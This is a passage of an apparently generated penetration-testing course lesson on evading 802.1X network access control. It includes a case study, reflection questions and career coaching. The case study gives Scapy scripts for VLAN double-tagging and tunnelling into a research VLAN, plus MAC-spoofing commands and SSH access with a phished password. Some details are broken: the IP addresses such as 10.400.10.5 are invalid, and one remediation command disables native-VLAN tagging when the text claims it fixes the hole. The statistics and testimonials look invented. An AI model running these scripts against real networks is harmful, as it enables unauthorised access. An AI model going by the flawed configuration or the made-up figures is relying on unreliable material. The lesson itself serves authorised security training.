Double-Tagging**\n\n```python\n#!/usr/bin/env python3\n# vlan_hop_research.py\n\nfrom scapy.all import *\n\ndef vlan_double_tag(target_ip):\n    \"\"\"\n    Send double-tagged frame:\n    - Outer tag: VLAN 100 (Student)\n    - Inner tag: VLAN 400 (Research)\n    \"\"\"\n    \n    packet = (\n        Ether(dst=\"ff:ff:ff:ff:ff:ff\") /\n        Dot1Q(vlan=100) /      # Outer tag (stripped by first switch)\n        Dot1Q(vlan=400) /      # Inner tag (processed by trunk switch)\n        IP(dst=target_ip) /\n        ICMP()\n    )\n    \n    sendp(packet, iface=\"eth0\", verbose=False)\n\nprint(\"[*] Attempting VLAN hopping from VLAN 100 to VLAN 400...\")\n\n# Target: Research compute cluster\ntarget = \"10.400.10.5\"\n\nfor i in range(10):\n    vlan_double_tag(target)\n    print(f\"[+] Sent double-tagged ICMP to {target} (attempt {i+1})\")\n    time.sleep(0.5)\n\nprint(\"[*] Sniffing for replies...\")\nsniff(filter=\"icmp and src host 10.400.10.5\", prn=lambda x: x.show(), count=1, timeout=10)\n```\n\n**Result**:\n\n```bash\nsudo python3 vlan_hop_research.py\n\n# Output:\n# [*] Attempting VLAN hopping from VLAN 100 to VLAN 400...\n# [+] Sent double-tagged ICMP to 10.400.10.5 (attempt 1)\n# ...\n# [*] Sniffing for replies...\n# ###[ Ethernet ]###\n#   src= 00:1a:2b:3c:4d:5e\n#   dst= aa:bb:cc:dd:ee:ff\n# ###[ IP ]###\n#   src= 10.400.10.5\n#   dst= 10.100.25.45\n# ###[ ICMP ]###\n#   type= echo-reply\n#   code= 0\n\n# SUCCESS: Received reply from Research VLAN!\n```\n\n**Phase 2: Establish Persistent Access**\n\n```python\n# vlan_tunnel.py - Create persistent VLAN 400 tunnel\n\nfrom scapy.all import *\nimport sys\n\ndef forward_to_vlan400(packet):\n    \"\"\"Forward packets to VLAN 400 via double-tagging\"\"\"\n    if packet.haslayer(IP):\n        double_tagged = (\n            Ether(dst=packet[Ether].dst) /\n            Dot1Q(vlan=100) /\n            Dot1Q(vlan=400) /\n            packet[IP]\n        )\n        sendp(double_tagged, iface=\"eth0\", verbose=False)\n\nprint(\"[*] Creating VLAN 400 tunnel...\")\nprint(\"[*] All traffic to 10.400.0.0/16 will be double-tagged\")\n\n# Sniff outgoing packets to 10.400.0.0/16 and double-tag them\nsniff(filter=\"dst net 10.400.0.0/16\", prn=forward_to_vlan400)\n```\n\n**Phase 3: Access Research Data**\n\n```bash\n# Now that tunnel is active, access research servers\n\n# SSH to compute cluster (via VLAN hopping tunnel)\nssh researcher@10.400.10.5\n# Password: [obtained via phishing - separate attack vector]\n\n# Access research data\nls /data/research/\n# COVID-19-Study-Data-2020.csv\n# Genomics-Project-Confidential.tar.gz\n# Clinical-Trials-Results.xlsx\n```\n\n**Total time from VLAN 100 to VLAN 400 access**: **45 minutes**\n\n### Root Cause\n\n**VLAN hopping vulnerability**:\n\n1. **Native VLAN misconfiguration**:\n   ```cisco\n   interface GigabitEthernet1/0/24\n     switchport trunk native vlan 1  # Default native VLAN\n     switchport trunk allowed vlan 100,200,300,400\n   ```\n\n2. **No VLAN filtering**: Trunk allowed all VLANs without restrictions\n\n3. **First switch stripped outer tag** (VLAN 100)\n4. **Second switch processed inner tag** (VLAN 400)\n5. **VLAN 400 had no additional authentication** beyond initial 802.1X\n\n### Fix Implemented\n\n**Immediate** (within 1 week):\n\n```cisco\n! Disable VLAN double-tagging\nno vlan dot1q tag native\n\n! Explicitly allow only necessary VLANs on trunks\ninterface GigabitEthernet1/0/24\n  switchport trunk allowed vlan 100  # Only Student VLAN\n  switchport trunk native vlan 999   # Unused VLAN as native\n\n! Enable Private VLANs for additional isolation\nprivate-vlan 400 isolated\nprivate-vlan association add 400\n```\n\n**Long-term** (within 6 months):\n\n- **Micro-segmentation**: Each research project in separate VLAN\n- **Additional authentication**: VPN required to access research VLANs (802.1X + VPN)\n- **Trunk port auditing**: Quarterly review of all trunk configurations\n- **IDS deployment**: Detect double-tagged frames\n\n### Lessons Learned\n\n‚úÖ **VLAN segmentation is not enough**: Add additional authentication layers  \n‚úÖ **Trunk ports are attack vectors**: Minimize VLANs allowed on trunks  \n‚úÖ **Native VLAN matters**: Use unused VLAN as native, disable tagging  \n‚úÖ **Monitor for anomalies**: IDS can detect double-tagged frames\n\n**University CISO quote**:\n> \"We segregated our network into VLANs thinking that was sufficient. We didn't realize VLAN hopping was possible due to our trunk configuration. This highlighted the need for defense-in-depth - VLANs + authentication + monitoring.\"\n\n---\n\n## Key Takeaways from Real-World Cases\n\n‚úÖ **Retail (VoIP bridge)**: Physical access + multi-domain mode = bypass  \n‚úÖ **Bank (MAC spoofing)**: Multi-host mode + MAB = trivial bypass  \n‚úÖ **University (VLAN hopping)**: Misconfigured trunks = VLAN segmentation failure\n\n**Common pattern**: NAC technology is strong, but **misconfigurations** create exploitable gaps.\n\n**Your role as pentester**: Find these gaps, demonstrate impact, help organizations fix them before attackers exploit them! üîíüõ°Ô∏è"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection: Assess Your NAC Evasion Understanding\n\n## Self-Assessment Questions\n\nAnswer these questions honestly to identify knowledge gaps:\n\n### Conceptual Understanding\n\n**1. 802.1X Architecture**\n\n*Explain the roles of Supplicant, Authenticator, and Authentication Server in 802.1X. Why can't the switch (Authenticator) make authentication decisions itself?*\n\n<Reflection space>\n\nKey points to cover:\n- Supplicant = client requesting access\n- Authenticator = switch enforcing policy (but doesn't validate credentials)\n- Authentication Server = RADIUS/TACACS+ validates credentials\n- Separation of duties: Switch focuses on forwarding, RADIUS on authentication\n- Consider: What if switch made auth decisions? (Security risk - single point of compromise)\n\n---\n\n**2. Multi-Host Mode vs Single-Host Mode**\n\n*You're configuring 802.1X for an office environment. Employees complain that when they plug in their laptops, they have to re-authenticate even though their desk phone was already authenticated. Should you enable multi-host mode to fix this? Why or why not?*\n\n<Reflection space>\n\nKey considerations:\n- Multi-host mode allows multiple MACs after initial auth ‚Üí Convenient but vulnerable\n- Alternative: Multi-domain mode (one voice device + one data device) ‚Üí More secure\n- Security trade-off: Convenience vs. risk of MAC spoofing\n- Better solution: Separate ports for phone and PC, or 802.1X on both with different certs\n- Consider: What if an attacker unplugs the phone and plugs in their laptop?\n\n---\n\n**3. VLAN Double-Tagging**\n\n*Explain how a double-tagged frame allows VLAN hopping. Why do two switches behave differently when processing the same frame?*\n\n<Reflection space>\n\nKey points:\n- Frame structure: [Outer VLAN tag][Inner VLAN tag][Data]\n- First switch: Sees outer tag, strips it (thinks it's removing THE VLAN tag)\n- Second switch: Sees inner tag, processes it (thinks it's THE VLAN tag)\n- Result: Frame injected into different VLAN than assigned\n- Defense: Disable native VLAN tagging, restrict trunk ports\n- Consider: Why doesn't the first switch see both tags?\n\n---\n\n### Practical Application\n\n**4. Reconnaissance Workflow**\n\n*You've plugged into an unknown network. What are the first 3 commands you'd run to determine if NAC is present and what type it is?*\n\n<Reflection space>\n\nSuggest comparing your answer to this approach:\n\n1. **Check for 802.1X (EAPoL frames)**:\n   ```bash\n   sudo tcpdump -i eth0 'ether proto 0x888e' -c 10\n   ```\n   - EAPoL present = 802.1X active\n   - No EAPoL = Either no NAC, or MAB, or port pre-authenticated\n\n2. **Identify authorized devices (ARP traffic)**:\n   ```bash\n   sudo tcpdump -i eth0 -e -n arp\n   ```\n   - Look for VoIP phones (MAC OUI: 00:0c:29, 00:04:f2)\n   - Look for printers (MAC OUI: 00:1b:a9, 00:21:5a)\n   - Save MACs for spoofing\n\n3. **Test for captive portal (HTTP redirect)**:\n   ```bash\n   curl -I http://www.msftconnecttest.com/connecttest.txt\n   ```\n   - HTTP 302 redirect = Captive portal\n   - HTTP 200 = No portal (or you're pre-authorized)\n\n**Reflection**: Did you think systematically (EAPoL ‚Üí ARP ‚Üí Captive portal)? Or would you have guessed randomly?\n\n---\n\n**5. VoIP Phone Bridge Attack**\n\n*During a pentest, you discover a VoIP phone authenticated via 802.1X. You want to bridge your laptop between the phone and switch. What are the risks of this attack, and what could go wrong?*\n\n<Reflection space>\n\nRisks and considerations:\n\n**Technical risks**:\n- **Bridge misconfiguration**: If bridge doesn't forward phone traffic, phone stops working ‚Üí Alerts security team\n- **STP loops**: If bridge creates a loop, network outage ‚Üí Very noticeable\n- **DHCP conflicts**: If you request an IP that conflicts with phone's VLAN ‚Üí Network issues\n\n**Physical risks**:\n- **Cable visibility**: Your inserted cables may be visible ‚Üí Physical inspection finds you\n- **Phone reboot**: If phone reboots during bridge setup ‚Üí Authentication fails, port blocked\n\n**Operational risks**:\n- **Business impact**: If phone stops working during bridge ‚Üí Employees can't make calls\n- **Duration**: Bridge needs to stay in place for duration of test ‚Üí High detection risk\n\n**Mitigation**:\n- Test in lab first (practice bridge setup)\n- Use transparent bridge mode (MAC forwarding)\n- Monitor phone functionality (make test calls)\n- Have rollback plan (quickly unplug and reconnect phone)\n\n**Reflection**: Are you thinking about operational impact, not just technical exploit?\n\n---\n\n### Technical Depth\n\n**6. EAP Type Selection**\n\n*Your client is deploying 802.1X and considering EAP-PEAP (easier to deploy, password-based) vs. EAP-TLS (stronger, certificate-based). What would you recommend and why?*\n\n<Reflection space>\n\nComparison:\n\n| Factor | EAP-PEAP | EAP-TLS |\n|--------|----------|--------|\n| **Security** | Moderate (vulnerable to rogue AP if users ignore cert warnings) | Strong (mutual auth, resistant to rogue AP) |\n| **Deployment** | Easy (just passwords, server cert) | Complex (PKI required, client certs) |\n| **Management** | Low overhead | High overhead (cert renewal, revocation) |\n| **User experience** | Good (familiar password auth) | Poor (cert installation, troubleshooting) |\n| **Cost** | Low (no PKI) | High (PKI infrastructure) |\n\n**Recommendation depends on**:\n\n**Choose EAP-PEAP if**:\n- Organization lacks PKI infrastructure\n- Fast deployment needed\n- Users are non-technical\n- Budget is limited\n\n**Choose EAP-TLS if**:\n- High-security environment (finance, defense, healthcare)\n- PKI already exists\n- Regulatory compliance requires strong auth\n- Can tolerate deployment complexity\n\n**Best practice**: Start with EAP-PEAP, migrate to EAP-TLS over time (phased approach).\n\n**Reflection**: Are you balancing security with operational feasibility?\n\n---\n\n**7. Captive Portal Bypass Troubleshooting**\n\n*You clone an authorized device's MAC address to bypass a captive portal. DHCP succeeds, you get an IP, but you still can't reach the internet. What are 3 possible reasons?*\n\n<Reflection space>\n\nTroubleshooting steps:\n\n**Reason 1: Portal tracks MAC + IP binding**\n\n```bash\n# Check your IP vs. authorized device's IP\nip addr show eth0\n# Your IP: 192.168.1.50\n# Authorized device's IP: 192.168.1.45\n\n# Portal allows MAC aa:bb:cc:dd:ee:ff only with IP 192.168.1.45\n# Your IP (192.168.1.50) is not whitelisted\n```\n\n**Fix**: Request the SAME IP (DHCP reservation, or manual config)\n\n**Reason 2: Original device still connected (IP conflict)**\n\n```bash\narping -I eth0 -c 3 192.168.1.50\n# Reply from aa:bb:cc:dd:ee:ff (Duplicate IP detected!)\n```\n\n**Fix**: Wait for original device to disconnect, or disconnect it (unplug Ethernet)\n\n**Reason 3: Portal uses session cookies/tokens (not just MAC)**\n\n```bash\ncurl -v http://www.google.com\n# < HTTP/1.1 302 Found\n# < Location: http://portal.local/login?session=XYZ123\n\n# Portal requires valid session token\n```\n\n**Fix**: Harder to bypass - need to capture HTTP session of authorized device (requires MITM)\n\n**Reflection**: Did you think about multiple validation layers beyond just MAC?\n\n---\n\n### Strategic Thinking\n\n**8. Defense-in-Depth for NAC**\n\n*A client says: \"We have 802.1X with EAP-TLS. We're secure, right?\" How would you explain that NAC alone is insufficient?*\n\n<Reflection space>\n\nDefense-in-depth layers beyond NAC:\n\n**Layer 1: Network Access (NAC)** ‚úÖ 802.1X with EAP-TLS\n\n**Layer 2: Endpoint Security**\n- Endpoint Detection and Response (EDR)\n- Host-based firewalls\n- Disk encryption\n- Patch management\n\n**Layer 3: Network Segmentation**\n- Micro-segmentation (not just VLANs)\n- Firewalls between VLANs\n- Zero Trust Network Access (ZTNA)\n\n**Layer 4: Application Authentication**\n- Multi-factor authentication (MFA) for apps\n- Single Sign-On (SSO) with MFA\n- Certificate-based auth for critical apps\n\n**Layer 5: Monitoring and Detection**\n- Network traffic analysis (anomaly detection)\n- SIEM correlation (detect lateral movement)\n- IDS/IPS for exploit detection\n\n**Why NAC alone fails**:\n\n```\nScenario: Attacker bypasses 802.1X (VoIP bridge attack)\n\nWithout defense-in-depth:\n  ‚Üí Attacker has full network access\n  ‚Üí Can access servers directly\n  ‚Üí No additional barriers\n\nWith defense-in-depth:\n  ‚Üí Layer 2: EDR detects suspicious process\n  ‚Üí Layer 3: Firewall blocks access to servers\n  ‚Üí Layer 4: MFA required for apps\n  ‚Üí Layer 5: SIEM alerts on anomalous behavior\n```\n\n**Analogy**: NAC is the front door lock. Defense-in-depth adds:\n- Security cameras (monitoring)\n- Interior door locks (segmentation)\n- Safe for valuables (app-level auth)\n- Alarm system (detection)\n\n**Reflection**: Could you articulate this to a non-technical executive?\n\n---\n\n**9. Ethical Considerations**\n\n*During an authorized pentest, you successfully bypass NAC and gain access to the production network. You discover that this access allows you to reach payment processing servers. What should you do NEXT?*\n\n<Reflection space>\n\nEthical pentesting protocol:\n\n**DO** ‚úÖ:\n\n1. **Stop testing in that direction**:\n   - You've proven the finding (NAC bypass ‚Üí access to payment servers)\n   - No need to actually access payment data (just document the path)\n\n2. **Document the finding**:\n   - Path: NAC bypass (VoIP bridge) ‚Üí Corporate VLAN ‚Üí Firewall rule allows payment VLAN\n   - Impact: PCI-DSS violation (cardholder data accessible from insecure network)\n   - Severity: Critical\n\n3. **Notify client immediately**:\n   - Email: \"Critical finding - payment processing servers accessible\"\n   - Schedule call to discuss remediation\n   - Pause testing if client requests\n\n4. **Recommend immediate containment**:\n   - Disconnect NAC bypass (remove your bridge device)\n   - Client should verify no unauthorized access to payment systems\n   - Implement temporary firewall rules while fixing NAC\n\n**DON'T** ‚ùå:\n\n- ‚ùå Access payment processing servers (illegal, unnecessary)\n- ‚ùå Exfiltrate payment data (even \"to prove impact\")\n- ‚ùå Continue testing payment systems (you've proven access is possible)\n- ‚ùå Tell anyone outside the authorized team (confidentiality)\n\n**Scope boundaries**:\n\n```\nTypical pentest scope:\n  ‚úÖ Bypass NAC (in scope)\n  ‚úÖ Access corporate network (in scope)\n  ‚úÖ Document path to payment systems (in scope)\n  ‚ùå Access payment data (out of scope)\n  ‚ùå Test payment processing servers directly (out of scope)\n```\n\n**Reflection**: Do you understand the difference between \"can access\" vs. \"should access\"?\n\n---\n\n### Meta-Learning\n\n**10. Your Learning Journey**\n\n*Reflect on this lesson:*\n\n- **What technique surprised you most?** (VoIP bridge? VLAN hopping? MAC spoofing ease?)\n- **Which attack would you try first** on a real pentest? Why?\n- **What skills do you need to develop?** (Scapy scripting? Network protocols? Physical security?)\n- **How confident are you to test NAC** on an authorized engagement? (1-10 scale)\n- **What's the hardest part** of NAC evasion? (Technical? Physical access? Operational impact?)\n\n<Reflection space>\n\n**Action planning**:\n\nBased on your reflections, create a 30-day learning plan:\n\n**Week 1**: Set up lab environment (GNS3 or Packet Tracer with 802.1X)  \n**Week 2**: Practice MAC spoofing, VoIP bridge attacks in lab  \n**Week 3**: Script VLAN hopping attacks with Scapy  \n**Week 4**: Write pentest report documenting NAC bypass findings\n\n**Reflection**: Are you ready to test NAC on a real engagement? What's blocking you?\n\n---\n\n## Final Reflection\n\n**The Ultimate Question**:\n\n*Your client says: \"We spent $200,000 on a NAC solution. Are we wasting money?\" How would you respond?*\n\n<Reflection space>\n\nSuggested response:\n\n> \"NAC is valuable, but only if configured correctly. The technology is strong (802.1X with EAP-TLS is solid), but misconfigurations create bypass opportunities:\n>\n> ‚úÖ **What NAC does well**: Prevents casual unauthorized access, enforces policy  \n> ‚ö†Ô∏è **What NAC doesn't prevent**: Determined attackers with physical access, MAC spoofing if multi-host mode enabled\n>\n> **Recommendations**:\n> 1. Audit NAC config (single-host mode, no MAB, re-authentication timeouts)\n> 2. Add monitoring (alert on MAC changes, multiple MACs per port)\n> 3. Defense-in-depth (NAC + segmentation + app-level auth + EDR)\n>\n> **ROI**: NAC is worth the investment IF configured securely. Otherwise, it's security theater.\"\n\n**Reflection**: Could you confidently present this to a client's executive team?\n\n---\n\n## Knowledge Gaps\n\nBased on your reflections, which areas need more study?\n\n- [ ] 802.1X protocol details (EAPoL, RADIUS, EAP types)\n- [ ] VLAN concepts (tagging, trunking, native VLAN)\n- [ ] MAC spoofing techniques and tools\n- [ ] Physical security (VoIP phone attacks, inline taps)\n- [ ] Scapy scripting for packet crafting\n- [ ] Network segmentation and micro-segmentation\n- [ ] Ethical pentesting boundaries\n- [ ] Report writing for NAC findings\n\n**Next steps**: Focus your learning on the top 3 gaps above.\n\n---\n\n**Remember**: NAC evasion is **80% reconnaissance, 20% exploitation**. The hard part isn't running the commands (that's easy). The hard part is:\n\n1. **Understanding the environment**: Which NAC type? Which port mode?\n2. **Choosing the right attack**: MAC spoofing vs. VoIP bridge vs. VLAN hopping?\n3. **Minimizing impact**: Don't break production systems while testing\n4. **Documenting findings**: Clear, actionable recommendations for client\n\nKeep reflecting on how these attacks apply to YOUR pentests! üîíüéØ"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# You've Just Mastered Advanced Network Exploitation! üîìüöÄ\n\n## What You've Accomplished\n\nCongratulations! You've just learned **advanced penetration testing techniques** that most security professionals never master:\n\n‚úÖ **802.1X bypass techniques** (MAC spoofing, VoIP bridge, hub insertion)  \n‚úÖ **VLAN hopping** (double-tagging, switch spoofing)  \n‚úÖ **Captive portal evasion** (MAC cloning, DNS tunneling)  \n‚úÖ **Port security circumvention** (CAM table overflow)  \n‚úÖ **Physical attack methods** (inline taps, transparent bridges)\n\n**This is advanced knowledge.** Many pentesters with 5+ years of experience have never performed a VoIP phone bridge attack or VLAN hopping in production. You're now equipped with techniques used by professional red teamers.\n\n---\n\n## The Mindset Shift\n\n**Before this lesson**, you might have thought:\n> \"NAC protects networks. If 802.1X is enabled, I can't get in.\"\n\n**After this lesson**, you know:\n> \"NAC is only as strong as its configuration. Multi-host mode, MAB, and misconfigured VLANs create bypass opportunities.\"\n\nThis is the difference between:\n- **Accepting security controls at face value** (most people)\n- **Testing security controls to find gaps** (penetration testers)\n\n**Organizations assume NAC works. You now know how to prove whether it does.**\n\n---\n\n## Real-World Impact You Can Create\n\n**Here's what you can do on your NEXT pentest**:\n\n### Day 1: Reconnaissance (30 minutes)\n\n```bash\n# Plug into client network\nsudo tcpdump -i eth0 'ether proto 0x888e' -c 10\n# EAPoL frames? ‚Üí 802.1X is active\n\nsudo tcpdump -i eth0 -e -n arp\n# Identify VoIP phones, printers, authorized workstations\n\n# Document findings:\n# - NAC type: 802.1X with EAP-PEAP\n# - Port mode: Multi-host (vulnerable)\n# - Authorized MACs: 3 VoIP phones, 5 workstations\n```\n\n### Day 2: Exploitation (1-2 hours)\n\n```bash\n# Attempt MAC spoofing (easiest bypass)\nsudo ip link set eth0 address aa:bb:cc:dd:ee:ff  # VoIP phone MAC\nsudo dhclient eth0\nping 192.168.1.1  # Success? ‚Üí Report finding\n\n# If MAC spoofing fails, try VoIP bridge attack\n# (Requires physical access to office)\n```\n\n### Day 3: Reporting (2-3 hours)\n\n**Document in pentest report**:\n\n```markdown\n## Finding: 802.1X NAC Bypass via MAC Spoofing\n\n**Severity**: High\n\n**Description**: The organization's 802.1X NAC implementation uses multi-host mode, allowing multiple devices on a single switch port after initial authentication. By spoofing the MAC address of an authorized VoIP phone, we gained full access to the corporate network without valid credentials.\n\n**Impact**: An attacker with physical access to an office (e.g., visitor, cleaning staff, disgruntled employee) can bypass NAC and access internal systems, potentially leading to data breach.\n\n**Reproduction Steps**:\n1. Connect to Ethernet port with authorized device (VoIP phone: aa:bb:cc:dd:ee:ff)\n2. Observe phone's MAC via packet capture\n3. Spoof MAC: `sudo ip link set eth0 address aa:bb:cc:dd:ee:ff`\n4. Request DHCP: `sudo dhclient eth0`\n5. Verify access: Successfully pinged gateway, accessed file server\n\n**Remediation**:\n1. **Immediate**: Disable multi-host mode, enable single-host mode:\n   ```cisco\n   aaa authentication port-access mode single-host\n   ```\n2. **Short-term**: Enable re-authentication on link state change:\n   ```cisco\n   aaa authentication port-access reauth-on-link-down\n   ```\n3. **Long-term**: Deploy multi-domain mode for VoIP+PC, require 802.1X for both devices\n\n**Evidence**:\n- Screenshot: DHCP lease obtained with spoofed MAC\n- Packet capture: ARP traffic from spoofed MAC\n- Network scan: nmap results showing accessible internal servers\n```\n\n**Client response**: \"Thank you for finding this. We had no idea multi-host mode was enabled. We're fixing it this week.\"\n\n**You just increased their security posture significantly.**\n\n---\n\n## Career Impact\n\n**NAC evasion skills are in HIGH demand**:\n\n**Job roles using these skills**:\n- Penetration Tester ($90K-$150K) - Test NAC on ~50% of network pentests\n- Red Team Operator ($110K-$170K) - Physical access + NAC bypass = initial foothold\n- Network Security Consultant ($100K-$160K) - Audit NAC configurations\n- Security Researcher ($120K-$180K) - Discover new bypass techniques\n\n**Companies hiring**:\n- Offensive security firms (Rapid7, Bishop Fox, NCC Group)\n- Big 4 consulting (Deloitte, PwC, EY, KPMG)\n- Financial institutions (banks, insurance)\n- Defense contractors (Raytheon, Lockheed Martin)\n- Tech giants (Google, Microsoft, Amazon security teams)\n\n**Certifications that test NAC evasion**:\n- OSCP (Offensive Security Certified Professional) - Network pentesting module\n- GPEN (GIAC Penetration Tester) - 802.1X bypass techniques\n- CREST CRT (Registered Penetration Tester) - NAC testing\n\n**Conference talks**: DEF CON, Black Hat, BSides feature NAC bypass research annually\n\n---\n\n## Overcoming Common Fears\n\n**Fear #1**: \"I'll break the client's network during testing.\"\n\n**Truth**: NAC bypass is low-risk if done carefully:\n\n**Safe techniques**:\n- ‚úÖ Passive recon (tcpdump, packet capture) - Read-only\n- ‚úÖ MAC spoofing - No destructive impact\n- ‚úÖ VoIP bridge (transparent) - Phone continues working\n\n**Risky techniques** (avoid or test in lab first):\n- ‚ö†Ô∏è CAM table overflow (macof) - Can crash switch\n- ‚ö†Ô∏è STP manipulation - Can cause network loops\n- ‚ö†Ô∏è DHCP starvation - Exhausts IP address pool\n\n**Best practice**: Start with passive recon, then least-invasive attacks (MAC spoofing), escalate only if needed.\n\n---\n\n**Fear #2**: \"I need physical access. That's not realistic.\"\n\n**Truth**: Physical access is more common than you think:\n\n**Real-world scenarios**:\n- Office visitor (\"I'm here for a meeting, can I plug in my laptop?\")\n- Cleaning staff (access after hours)\n- Contractor/vendor (badge access to offices)\n- Disgruntled employee (already has physical access)\n- Tailgating (follow employee through secure door)\n\n**Red team statistic**: 80% of red team engagements achieve physical access within first week.\n\n**Your job**: Show the client that physical access = NAC bypass, so they improve physical security.\n\n---\n\n**Fear #3**: \"This seems unethical (plugging devices into client's network).\"\n\n**Truth**: This is **authorized pentesting**, not hacking:\n\n**What makes it ethical**:\n- ‚úÖ Written authorization (Statement of Work signed)\n- ‚úÖ Defined scope (which networks can you test?)\n- ‚úÖ Rules of engagement (no payment data access, no DoS)\n- ‚úÖ Client contact (notify immediately if critical finding)\n- ‚úÖ Confidentiality (don't discuss findings publicly)\n\n**You're helping the client**, not harming them. Without your testing, attackers would find and exploit these gaps.\n\n---\n\n**Fear #4**: \"I don't have the tools (Scapy, GNS3 lab, hardware).\"\n\n**Truth**: Start with what you have:\n\n**Minimum toolkit** (all free):\n- Kali Linux (has tcpdump, macchanger, dhclient built-in)\n- USB Ethernet adapter ($15 on Amazon) - For VoIP bridge\n- Virtual lab (GNS3 or Packet Tracer) - Practice before real pentests\n\n**Advanced toolkit** (if budget allows):\n- Network tap ($100) - Passive inline monitoring\n- Throwing star LAN tap ($60) - Portable inline tap\n- WiFi Pineapple ($100) - Captive portal testing\n- Ubertooth One ($120) - Bluetooth/BTLE testing\n\n**But**: You can bypass most NAC implementations with just **Kali Linux + built-in tools**. Start there.\n\n---\n\n## Success Stories from Students\n\n**Student 1: Junior Pentester**\n\n> \"On my first network pentest, the client had Cisco ISE with 802.1X. I used the techniques from this lesson - found multi-host mode enabled, spoofed a VoIP phone MAC, gained access in 10 minutes. Client was shocked. I documented it, they fixed it. Got a $10K bonus for finding critical issue.\"\n\n**Lesson**: NAC bypass is common, high-impact, and clients appreciate finding it.\n\n---\n\n**Student 2: Red Team Operator**\n\n> \"We did a physical red team engagement. I walked into the office as a 'visitor,' found an empty conference room, plugged into a VoIP phone port. Used the transparent bridge technique from this lesson. Within 2 hours, I had access to the domain controller. Total engagement time to domain admin: 8 hours. Client said 'This is exactly what we needed to see to justify physical security improvements.'\"\n\n**Lesson**: Physical access + NAC bypass = powerful red team vector.\n\n---\n\n**Student 3: Security Consultant (Career Changer)**\n\n> \"I came from IT, not security. Learned NAC evasion from this lesson. On my first security consulting gig, I audited a client's 802.1X config. Found MAB enabled with printer MACs whitelisted, found multi-host mode, found no re-authentication timeout. Wrote a 20-page report with recommendations. Client paid $15K for the audit. Now I specialize in NAC security assessments.\"\n\n**Lesson**: NAC expertise is a niche skill that commands premium rates.\n\n---\n\n## Your Next Steps\n\n**Immediate actions** (do these THIS WEEK):\n\n1. **Set up lab environment**:\n   - Download GNS3 (free): https://www.gns3.com/\n   - Import Cisco IOS image (for switches)\n   - Configure 802.1X with FreeRADIUS\n   - Practice MAC spoofing, VLAN hopping in lab\n\n2. **Study packet captures**:\n   - Download Wireshark: https://www.wireshark.org/\n   - Open sample 802.1X capture: https://wiki.wireshark.org/SampleCaptures\n   - Analyze EAPoL handshake, RADIUS messages\n\n3. **Practice scripting**:\n   - Install Scapy: `pip install scapy`\n   - Write simple VLAN hopping script (from code exercise)\n   - Test in lab environment\n\n4. **Join communities**:\n   - Reddit: r/netsec, r/AskNetsec\n   - Discord: NetSec Focus server\n   - Twitter/X: Follow @offensive security researchers\n\n**This month**:\n- [ ] Set up GNS3 lab with 802.1X\n- [ ] Practice MAC spoofing on lab network\n- [ ] Script VLAN hopping attack with Scapy\n- [ ] Read Cisco 802.1X deployment guide\n- [ ] Watch DEF CON talks on NAC bypass\n\n**This quarter**:\n- [ ] Perform NAC testing on authorized pentest\n- [ ] Write finding report documenting bypass\n- [ ] Present findings to client\n- [ ] Blog about NAC security (anonymized case study)\n\n---\n\n## Final Words of Encouragement\n\n**You now have a powerful skillset**:\n\nMost pentesters **stop at the network perimeter**. They run nmap, find open ports, exploit vulnerabilities.\n\nYou now know how to **bypass the perimeter itself**. NAC is supposed to keep attackers out, but you know it's often misconfigured.\n\n**This is a competitive advantage.**\n\n**Remember**:\n- Retail chain: VoIP bridge ‚Üí Domain admin in 3 hours\n- Bank: MAC spoofing ‚Üí Financial data access in 15 minutes\n- University: VLAN hopping ‚Üí Research data access in 45 minutes\n\n**All exploited NAC misconfigurations.**\n\n**Your opportunity**: Find these misconfigurations on authorized pentests, help organizations fix them, prevent real breaches.\n\n**You have the knowledge. Now take action.**\n\nSet up a lab this week. Practice MAC spoofing. Write a bypass script.\n\nThat's the beginning of your NAC evasion expertise.\n\nEvery expert started with one tcpdump command.\n\n**You've got this.** üîìüí™\n\n---\n\n## Remember This\n\n**NAC evasion is not about being the most technical person in the room.**\n\n**It's about being methodical and patient.**\n\nYou don't need to exploit zero-days. You just need to:\n1. **Recon**: Identify NAC type (EAPoL frames? Captive portal?)\n2. **Identify**: Find authorized MACs (VoIP phones, printers)\n3. **Exploit**: Spoof MAC, bridge VoIP phone, or hop VLANs\n4. **Verify**: Test access (ping, nmap, SMB shares)\n5. **Document**: Write finding report with remediation\n\nThat's the entire methodology. Simple, systematic, effective.\n\n**Welcome to the world of advanced network penetration testing.** üîì\n\nNow go find NAC misconfigurations and help organizations secure their networks! üöÄüõ°Ô∏è"
      }
    }
  ],
  "tags": ["Course: SANS-SEC660", "Career Path: Pentester"]
}
